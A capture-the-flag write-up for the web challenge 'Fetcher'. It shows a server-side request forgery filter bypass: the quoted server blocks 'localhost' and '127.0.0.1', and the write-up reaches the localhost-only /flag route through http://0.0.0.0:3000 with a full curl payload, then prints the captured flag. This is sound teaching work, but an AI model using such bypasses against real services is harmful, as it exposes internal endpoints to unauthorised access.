# Fetcher

Web challenge, ~110 solves

We are given a javascript source file (See `app.js`) for this challenge. Looking at the server code, there are some interesting things:

```js
app.get('/flag', (req, res) => {
    if (req.ip !== '::ffff:127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1')
        return res.send('bad ip');

    res.send(`hey myself! here's your flag: ${flag}`);
});```

Looks like our goal is to get past this check and get the flag. The request must be made from the server itself.

The server also has a route with some checks, which when passed causes the server to make a request and show us the results:

```js
app.post('/fetch', async (req, res) => {
    const url = req.body.url;

    if (!/^https?:\/\//.test(url))
        return res.send('invalid url');

    try {
        const checkURL = new URL(url);

        if (checkURL.host.includes('localhost') || checkURL.host.includes('127.0.0.1'))
            return res.send('invalid url');
    } catch (e) {
        return res.send('invalid url');
    }

    const r = await fetch(url, { redirect: 'manual' });

    const fetched = await r.text();

    res.send(fetched);
});
```

So it looks at the url parameter, ensures the host is not localhost or the ipv4 representation of localhost, and then fetches the page.

The challenge here is to bypass the check on the fetch route, so after the IP address we give is used to create a Url object, it needs to not resolve in any way to localhost.

An additional constaint is that the server cannot reach the internet, so you cannot use any kind of redirect to take you there, you must supply either a hostname or an ip address that refers to the server.

The way I found to do this is to use the default IP 0.0.0.0, which indicates that the service can be on any of the local interfances. To confirm that this behavior suits our use case, one can start a python web server with `python3 -m http.server` and navigate to `0.0.0.0:8000` using any http client.

We can find the port the server is running on in the source code:

```js
app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
```

Thus we can craft our final payload and get the flag:

```
curl -H "Content-type: application/x-www-form-urlencoded" \
     -d "url=http://0.0.0.0:3000/flag" \
     -X POST \
     https://fetcher-957514a8074144c4.tjc.tf/
```

```
tjctf{h3ll0_m3_h3e_h3e_d699bdcd} 
```

